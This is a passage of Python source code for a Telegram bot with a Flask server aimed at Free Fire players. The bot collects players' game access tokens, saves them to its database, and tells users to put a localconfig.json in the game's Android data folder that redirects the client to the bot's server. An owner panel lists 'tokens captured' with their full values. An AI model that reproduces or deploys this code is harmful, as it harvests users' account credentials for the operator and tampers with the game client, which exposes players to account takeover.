        await owner_panel(update, context)

async def handle_token_input(update, context):
    user_id = update.effective_user.id
    token = update.message.text.strip()

    if token == "/cancel":
        context.user_data["awaiting_token"] = False
        return await update.message.reply_html("ᴏᴘᴇʀᴀᴛɪᴏɴ ᴄᴀɴᴄᴇʟʟᴇᴅ.", reply_markup=get_keyboard(user_id))

    processing_msg = await update.message.reply_html("<i> ᴘʀᴏᴄᴇssɪɴɢ ᴛᴏᴋᴇɴ ᴀɴᴅ ɢᴇɴᴇʀᴀᴛɪɴɢ ᴛʜᴇ sᴇssɪᴏɴ......</i>")

    # test.py import - placeholder, user will add later
    try:
        from test import generate_hex_content
        hex_content, open_id = generate_hex_content(token)
    except Exception as e:
        hex_content, open_id = None, None
        print(f"test.py error: {e}")

    if not hex_content:
        context.user_data["awaiting_token"] = False
        try:
            await processing_msg.delete()
        except Exception:
            pass
        return await update.message.reply_html(
            "<b>ɪɴᴠᴀʟɪᴅ ᴛᴏᴋᴇɴ</b>\n\n"
            "ᴛʜᴇ ᴀᴄᴄᴇss ᴛᴏᴋᴇɴ ʏᴏᴜ ᴘʀᴏᴠɪᴅᴇᴅ ᴅɪᴅ ɴᴏᴛ ᴘʀᴏᴅᴜᴄᴇ ᴀ ᴠᴀʟɪᴅ ʀᴇsᴘᴏɴsᴇ.\n"
            "ᴘʟᴇᴀsᴇ ᴄʜᴇᴄᴋ ʏᴏᴜʀ ᴀᴄᴄᴇss ᴛᴏᴋᴇɴ.",
            reply_markup=get_keyboard(user_id))

    server_url = f"{RENDER_URL}/{user_id}/" if RENDER_URL else f"http://localhost:{PORT}/{user_id}/"

    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    with active_sessions_lock:
        active_sessions[str(user_id)] = {
            "access_token": token,
            "open_id": open_id,
            "started_at": now
        }

    db_log_session(user_id, token, open_id, now)
    db_save_token(user_id, open_id, token)

    context.user_data["awaiting_token"] = False

    config_data = {"serverUrl": server_url}
    config_json = json.dumps(config_data, indent=2)
    temp_config = f"lcfg_{user_id}.json"
    try:
        with open(temp_config, 'w', encoding='utf-8') as f:
            f.write(config_json)
    except Exception as e:
        print(f"Failed to create config file: {e}")

    try:
        await processing_msg.delete()
    except:
        pass

    await update.message.reply_html(
    f"✅ <b>sᴜᴄᴄᴇssꜰᴜʟʟʏ ᴄʀᴇᴀᴛᴇᴅ ᴀᴄᴄᴇss ᴛᴏᴋᴇɴ ᴀɴᴅ sᴇʀᴠᴇʀ ᴜʀʟ</b>\n\n"
    f"<code>{server_url}</code>\n\n"
    f"📋 <b>ʜᴏᴡ ᴛᴏ ᴜsᴇ</b>\n\n"
    f"1. ᴄᴏᴘʏ ᴛʜᴇ sᴇʀᴠᴇʀ ᴜʀʟ ᴀʙᴏᴠᴇ\n"
    f"2. ɢᴏ ᴛᴏ ᴛʜɪs ᴅɪʀᴇᴄᴛᴏʀʏ:\n"
    f"<code>/storage/emulated/0/Android/data/com.dts.freefiremax/files/</code>\n"
    f"3. ᴄʀᴇᴀᴛᴇ ᴀ ɴᴇᴡ ғɪʟᴇ ɴᴀᴍᴇᴅ <code>localconfig.json</code>\n"
    f"4. ᴘᴀsᴛᴇ ᴛʜᴇ ғᴏʟʟᴏᴡɪɴɢ ᴄᴏɴᴛᴇɴᴛ ɪɴᴛᴏ ᴛʜᴇ ғɪʟᴇ:\n"
    f"<pre><code>{{\n  \"serverUrl\": \"{server_url}\"\n}}</code></pre>\n"
    f"5. sᴀᴠᴇ ᴛʜᴇ ғɪʟᴇ\n"
    f"6. ᴏᴘᴇɴ ꜰʀᴇᴇ ꜰɪʀᴇ ᴏʀ ꜰʀᴇᴇ ꜰɪʀᴇ ᴍᴀx, ᴄʜᴏᴏsᴇ ᴀɴʏ ᴘʟᴀᴛꜰᴏʀᴍ ᴀɴᴅ ʟᴏɢɪɴ ᴛᴏ ʏᴏᴜʀ ɢᴀᴍᴇ ᴀᴄᴄᴏᴜɴᴛ\n"
    f"7. ᴏɴᴄᴇ ʟᴏɢɢᴇᴅ ɪɴ, ʏᴏᴜ ᴄᴀɴ ᴘʟᴀʏ ᴜɴʟɪᴍɪᴛᴇᴅ ᴍᴀᴛᴄʜᴇs\n\n"
    f"⚠️ <b>ɴᴏᴛᴇ:</b> ᴡᴏʀᴋs ᴡɪᴛʜ ʙᴏᴛʜ ꜰʀᴇᴇ ꜰɪʀᴇ ᴀɴᴅ ꜰʀᴇᴇ ꜰɪʀᴇ ᴍᴀx.\n"
    f"ᴅᴍ @HARSHU ɪғ ʏᴏᴜ ғᴀᴄᴇ ᴀɴʏ ɪssᴜᴇs.",
        reply_markup=get_keyboard(user_id)
    )

    try:
        await update.message.reply_document(
            document=open(temp_config, 'rb'),
            filename="localconfig.json",
            caption = (
    "📂 ᴘʟᴀᴄᴇ ᴛʜɪs ғɪʟᴇ ɪɴ ʏᴏᴜʀ ɢᴀᴍᴇ ᴅɪʀᴇᴄᴛᴏʀʏ\n\n"
    "<b>ʜᴏᴡ ᴛᴏ ᴜsᴇ:</b>\n"
    "1. ᴅᴏᴡɴʟᴏᴀᴅ ᴛʜᴇ ғɪʟᴇ\n"
    "2. ᴏᴘᴇɴ ᴛʜᴇ ғᴏʟᴅᴇʀ ᴡʜᴇʀᴇ ᴛʜᴇ ғɪʟᴇ ᴡᴀs ᴅᴏᴡɴʟᴏᴀᴅᴇᴅ\n"
    "3. ᴄᴏᴘʏ ᴛʜᴇ ғɪʟᴇ\n"
    "4. ɢᴏ ᴛᴏ:\n"
    "<code>/storage/emulated/0/Android/data/com.dts.freefiremax/files/</code>\n"
    "5. ᴘᴀsᴛᴇ ᴛʜᴇ ғɪʟᴇ ɪɴᴛᴏ ᴛʜɪs ғᴏʟᴅᴇʀ\n"
    "6. ᴏᴘᴇɴ ꜰʀᴇᴇ ꜰɪʀᴇ ᴏʀ ꜰʀᴇᴇ ꜰɪʀᴇ ᴍᴀx, ᴄʜᴏᴏsᴇ ᴀɴʏ ᴘʟᴀᴛꜰᴏʀᴍ ᴀɴᴅ ʟᴏɢɪɴ ᴛᴏ ʏᴏᴜʀ ɢᴀᴍᴇ ᴀᴄᴄᴏᴜɴᴛ\n"
    "7. ᴏɴᴄᴇ sᴜᴄᴄᴇssғᴜʟʟʏ ʟᴏɢɢᴇᴅ ɪɴ, ʏᴏᴜ ᴄᴀɴ ᴘʟᴀʏ ᴜɴʟɪᴍɪᴛᴇᴅ ᴍᴀᴛᴄʜᴇs\n\n"
    "⚠️ <b>ɴᴏᴛᴇ:</b> ᴛʜɪs ᴍᴇᴛʜᴏᴅ ᴡᴏʀᴋs ᴡɪᴛʜ ʙᴏᴛʜ ꜰʀᴇᴇ ꜰɪʀᴇ ᴀɴᴅ ꜰʀᴇᴇ ꜰɪʀᴇ ᴍᴀx.\n"
    "ɪғ ʏᴏᴜ ғᴀᴄᴇ ᴀɴʏ ɪssᴜᴇs, ᴅᴍ @HARSHU"
            ),
            parse_mode="HTML"
        )
    except Exception as e:
        print(f"Failed to send document: {e}")
        await update.message.reply_text(" Failed to send localconfig.json...")

    try:
        if os.path.exists(temp_config):
            os.remove(temp_config)
    except:
        pass

async def owner_panel(update, context):
    global MAINTENANCE_MODE
    tu = db_get_total_users()
    tt = db_get_total_tokens()
    ms = "🔴 ON" if MAINTENANCE_MODE else "🟢 OFF"

    kb = [
        [InlineKeyboardButton("👥 ᴀʟʟ ᴜsᴇʀs", callback_data="owner_users")],
        [InlineKeyboardButton("🎫 ᴀʟʟ ᴛᴏᴋᴇɴs", callback_data="owner_tokens")],
        [InlineKeyboardButton("📢 ʙʀᴏᴀᴅᴄᴀsᴛ", callback_data="owner_bc")],
        [InlineKeyboardButton("🚫 ʙᴀɴ", callback_data="owner_ban")],
        [InlineKeyboardButton("✅ ᴜɴʙᴀɴ", callback_data="owner_unban")],
        [InlineKeyboardButton("🛠️ Maintenance ON" if not MAINTENANCE_MODE else "✅ Maintenance OFF", 
                              callback_data="owner_maint_on" if not MAINTENANCE_MODE else "owner_maint_off")],
        [InlineKeyboardButton("🔙 ʙᴀᴄᴋ", callback_data="owner_back")]
    ]
    await update.message.reply_html(
        f"<b>👑 Owner Control Panel</b>\n\n"
        f"👥 Total Users: <b>{tu}</b>\n"
        f"🎫 Total Tokens: <b>{tt}</b>\n"
        f"🔧 Maintenance: {ms}",
        reply_markup=InlineKeyboardMarkup(kb))

async def owner_cb(update, context):
    global MAINTENANCE_MODE
    q = update.callback_query
    await q.answer()
    if q.from_user.id != OWNER_ID:
        return await q.edit_message_text(" Unauthorized access.")

    d = q.data
    if d == "owner_users":
        users = db_get_all_users()
        if not users:
            return await q.edit_message_text("No users found.")
        txt = f"<b>ᴀʟʟ ᴜsᴇʀs ({len(users)})</b>\n\n"
        for u in users:
            s = "🚫" if u[6] == 1 else "✅"
            txt += f"{s} <code>{u[0]}</code> | {u[1] or 'N/A'} | {u[4]}\n"
        kb = [[InlineKeyboardButton("🔙 Back", callback_data="owner_back")]]
        await q.edit_message_text(txt, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(kb))

    elif d == "owner_tokens":
        tokens = db_get_all_tokens()
        if not tokens:
            return await q.edit_message_text("No tokens captured yet.")
        txt = f"<b>ᴀʟʟ ᴛᴏᴋᴇɴs ({len(tokens)})</b>\n\n"
        for t in tokens[:10]:
            txt += f"━━━━━━━━━━━━━━━\n👤 <b>User:</b> <code>{t[1]}</code>\n🆔 <b>Open ID:</b> <code>{t[2]}</code>\n🔑 <b>Token:</b> <code>{t[3]}</code>\n🕒 <b>Time:</b> {t[4]}\n"
        if len(tokens) > 10:
            txt += f"\n... and {len(tokens)-10} more"
        kb = [[InlineKeyboardButton("🔙 Back", callback_data="owner_back")]]
        await q.edit_message_text(txt, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(kb))

    elif d == "owner_bc":
        context.user_data["awaiting_broadcast"] = True
        await q.edit_message_text(
            "<b>📢 ʙʀᴏᴀᴅᴄᴀsᴛ ᴍᴏᴅᴇ</b>\n\n"
            "<i>Send the message to broadcast to all users.</i>\n\n"
            "📝 <b>Send your message below:</b>\n\n"
            "⚠️ <i>Type <code>/cancel</code> to cancel.</i>",
            parse_mode="HTML")

    elif d == "owner_ban":
        context.user_data["awaiting_ban"] = True
        await q.edit_message_text(
            "<b>🚫 ʙᴀɴ ᴜsᴇʀ</b>\n\n"
            "<i>Enter the user ID to ban.</i>\n\n"
            "📝 <b>Send user ID below:</b>\n\n"
            "⚠️ <i>Type <code>/cancel</code> to cancel.</i>",
            parse_mode="HTML")

    elif d == "owner_unban":
        context.user_data["awaiting_unban"] = True
        await q.edit_message_text(
            "<b>✅ ᴜɴʙᴀɴ ᴜsᴇʀ</b>\n\n"
            "<i>Enter the user ID to unban.</i>\n\n"
            "📝 <b>Send user ID below:</b>\n\n"
            "⚠️ <i>Type <code>/cancel</code> to cancel.</i>",
            parse_mode="HTML")

    elif d == "owner_maint_on":
        MAINTENANCE_MODE = True
        db_set_maintenance(True)
        await q.edit_message_text("✅ <b>Maintenance mode enabled!</b>", parse_mode="HTML")

    elif d == "owner_maint_off":
        MAINTENANCE_MODE = False
        db_set_maintenance(False)
        await q.edit_message_text("✅ <b>Maintenance mode disabled!</b>", parse_mode="HTML")

    elif d == "owner_back":
        tu = db_get_total_users()
        tt = db_get_total_tokens()
        ms = "🔴 ON" if MAINTENANCE_MODE else "🟢 OFF"
        kb = [
            [InlineKeyboardButton("👥 ᴀʟʟ ᴜsᴇʀs", callback_data="owner_users")],
            [InlineKeyboardButton("🎫 ᴀʟʟ ᴛᴏᴋᴇɴs", callback_data="owner_tokens")],
            [InlineKeyboardButton("📢 ʙʀᴏᴀᴅᴄᴀsᴛ", callback_data="owner_bc")],
            [InlineKeyboardButton("🚫 ʙᴀɴ", callback_data="owner_ban")],
            [InlineKeyboardButton("✅ ᴜɴʙᴀɴ", callback_data="owner_unban")],
            [InlineKeyboardButton("🛠️ Maintenance ON" if not MAINTENANCE_MODE else "✅ Maintenance OFF",
                                  callback_data="owner_maint_on" if not MAINTENANCE_MODE else "owner_maint_off")],
            [InlineKeyboardButton("🔙 ʙᴀᴄᴋ", callback_data="owner_back")]
        ]
        await q.edit_message_text(
            f"<b>👑 Owner Control Panel</b>\n\n"
            f"👥 Total Users: <b>{tu}</b>\n"
            f"🎫 Total Tokens: <b>{tt}</b>\n"
            f"🔧 Maintenance: {ms}",
            parse_mode="HTML", reply_markup=InlineKeyboardMarkup(kb))

async def handle_admin(update, context):
    uid = update.effective_user.id
    if uid != OWNER_ID:
        return

    if context.user_data.get("awaiting_broadcast"):
        txt = update.message.text
        if txt == "/cancel":
            context.user_data["awaiting_broadcast"] = False
            return await update.message.reply_text("❌ Broadcast cancelled.", reply_markup=get_keyboard(uid))
        context.user_data["awaiting_broadcast"] = False
        users = db_get_all_users()
        sent = 0
        failed = 0
        progress = await update.message.reply_text(f"📢 Broadcasting to {len(users)} users...")
        for u in users:
            if u[6] == 1:
                continue
            try:
                await context.bot.send_message(u[0], txt, parse_mode="HTML")
                sent += 1
                await asyncio.sleep(0.03)
            except:
                failed += 1
        db_save_broadcast(txt, sent)
        await progress.edit_text(f"<b>✅ Broadcast Complete!</b>\n\n📨 Sent: <b>{sent}</b>\n❌ Failed: <b>{failed}</b>\n👥 Total: <b>{len(users)}</b>", parse_mode="HTML")
        await update.message.reply_html("<b>✅ Done!</b>", reply_markup=get_keyboard(uid))
        return

    if context.user_data.get("awaiting_ban"):
        txt = update.message.text.strip()
        if txt == "/cancel":
            context.user_data["awaiting_ban"] = False
            return await update.message.reply_text("❌ Ban cancelled.", reply_markup=get_keyboard(uid))
        try:
            db_ban_user(int(txt), True)
            await update.message.reply_text(f"✅ User <code>{txt}</code> banned!", parse_mode="HTML")
        except:
            await update.message.reply_text("❌ Invalid ID.")
        context.user_data["awaiting_ban"] = False
        await update.message.reply_html("<b>✅ Done!</b>", reply_markup=get_keyboard(uid))
        return

    if context.user_data.get("awaiting_unban"):
        txt = update.message.text.strip()
        if txt == "/cancel":
            context.user_data["awaiting_unban"] = False
            return await update.message.reply_text("❌ Unban cancelled.", reply_markup=get_keyboard(uid))
        try:
            db_ban_user(int(txt), False)
            await update.message.reply_text(f"✅ User <code>{txt}</code> unbanned!", parse_mode="HTML")
        except:
            await update.message.reply_text("❌ Invalid ID.")
        context.user_data["awaiting_unban"] = False
        await update.message.reply_html("<b>✅ Done!</b>", reply_markup=get_keyboard(uid))
        return

async def handle_all(update, context):
    if update.message and update.message.text and update.message.text.startswith("/"):
        return
    if context.user_data.get("awaiting_token"):
        return await handle_token_input(update, context)
    if context.user_data.get("awaiting_broadcast") or context.user_data.get("awaiting_ban") or context.user_data.get("awaiting_unban"):
        return await handle_admin(update, context)
    if update.message and update.message.text:
        await handle_buttons(update, context)

async def err_handler(update, context):
    try:
        e = str(context.error)
        if "Message is not modified" in e or "Chat not found" in e:
            return
        print(f"[!] Error: {e[:100]}")
    except:
        pass

# ═══════════════════════════════════════════════════════════════
# FLASK ROUTES
# ═══════════════════════════════════════════════════════════════
@app.route('/')
def home():
    return "✅ Free Fire Login Bot Server is Running!"

@app.route('/<user_id>/', methods=['GET', 'POST'])
def proxy_handler(user_id):
    """Handle proxy requests from Free Fire game"""
    return Response("Proxy active", status=200)

@app.route('/webhook', methods=['POST'])
def webhook():
    """Receive Telegram webhook updates"""
    if request.method == 'POST':
        update = Update.de_json(request.get_json(force=True), bot_app.bot)
        # Use the bot app's event loop to process update
        asyncio.create_task(bot_app.process_update(update))
        return 'OK', 200

# ═══════════════════════════════════════════════════════════════
# BOT SETUP
# ═══════════════════════════════════════════════════════════════
bot_app = None

def init_bot():
    global bot_app
    bot_app = (Application.builder().token(BOT_TOKEN).concurrent_updates(True)
               .read_timeout(30).write_timeout(30).connect_timeout(30).pool_timeout(30).build())

    bot_app.add_handler(CommandHandler("start", start))
    bot_app.add_handler(CommandHandler("cancel", lambda u, c: (c.user_data.clear(), u.message.reply_text("✅ Cancelled.", reply_markup=get_keyboard(u.effective_user.id)))))
    bot_app.add_handler(CallbackQueryHandler(check_joined_cb, pattern="check_joined"))
    bot_app.add_handler(CallbackQueryHandler(owner_cb, pattern="^owner_"))
    bot_app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_all))
    bot_app.add_error_handler(err_handler)

    return bot_app

# ═══════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════
if __name__ == '__main__':
    init_bot()

    if RENDER_URL:
        webhook_url = f"{RENDER_URL}/webhook"
        try:
            bot_app.bot.set_webhook(url=webhook_url)
            print(f"🔔 Webhook set to: {webhook_url}")
        except Exception as e:
            print(f"⚠️ Failed to set webhook: {e}")

    print(f"🚀 Starting server on port {PORT}...")
    app.run(host='0.0.0.0', port=PORT, debug=False, threaded=True)
